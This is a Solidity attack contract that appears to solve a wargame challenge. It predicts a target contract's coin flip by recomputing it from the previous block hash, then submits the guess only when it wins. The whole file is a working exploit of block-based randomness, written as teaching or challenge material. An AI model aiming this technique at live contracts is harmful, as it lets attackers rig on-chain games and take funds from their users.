// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuesser {
    uint256 public immutable FACTOR;

    constructor() {
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    }

    function flip(address instance) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = ICoinFlip(instance).flip(side);
        require(success, "Wrong guess, going to zero avoided");
    }
}